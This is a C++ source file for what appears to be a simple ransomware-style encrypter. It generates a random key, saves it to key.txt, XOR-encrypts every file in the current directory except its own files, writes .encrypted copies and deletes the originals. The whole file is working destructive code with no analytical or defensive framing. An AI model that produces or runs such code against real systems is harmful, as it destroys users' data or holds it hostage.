#include <iostream>
#include <fstream>
#include <random>
#include <string>
#include <dirent.h>
#include <cstring>
#include <filesystem>

// Function to generate a random key with a given length
std::string generateKey(std::size_t length) {
  // Create a random generator engine and initialize it with a random seed
  std::random_device rd;
  std::mt19937 gen(rd());

  // Use a uniform distribution to generate random characters for the key
  std::uniform_int_distribution<> dis(0, 255);

  // Create the key by generating random characters and appending them to a string
  std::string key;
  for (std::size_t i = 0; i < length; ++i) {
    key += static_cast<char>(dis(gen));
  }

  return key;
}

int main(int argc, char** argv) {
  // Generate a random key with a length of 32 characters
  std::string key = generateKey(32);

  // Save the key to a file named "key.txt"
  std::ofstream out("key.txt");
  out << key;
  out.close();

  // Open the current directory
  DIR* dir = opendir(".");

  // Loop over all files in the current directory
  struct dirent* entry;
  while ((entry = readdir(dir)) != nullptr) {
    // Get the file name
    std::string fileName = entry->d_name;

    // Check if the file is not the key file, the encrypter itself, or a directory entry
    if (fileName.compare("key.txt") && fileName.compare("encrypter.exe") && fileName.compare("encrypter.cpp") && fileName.compare("decrypter.exe") && fileName.compare("decrypter.cpp") && fileName[0] != '.') {
      // Open the file in binary mode
      std::ifstream in(fileName, std::ios::binary);

      // Create an output stream to write the encrypted file
      std::ofstream out(fileName + ".encrypted", std::ios::binary);

      // Get the file size
      in.seekg(0, std::ios::end);
      std::size_t fileSize = in.tellg();
      in.seekg(0, std::ios::beg);

      // Calculate the number of padding bytes to add to the end of the file
      std::size_t padding = key.length() - fileSize % key.length();

      // Encrypt the file by XOR-ing each byte with the corresponding byte in the key
      char c;
      std::size_t keyIndex = 0;
      while (in.get(c)) {
        out.put(c ^ key[keyIndex]);
        keyIndex = (keyIndex + 1) % key.length();
      }

      // Add padding to the end of the file
      for (std::size_t i = 0; i < padding; ++i) {
        out.put(static_cast<char>(padding));
      }

      // Close the output stream
      out.close();

      // Remove the original file
      std::remove(fileName.c_str());
    }
  }

  return 0;
}
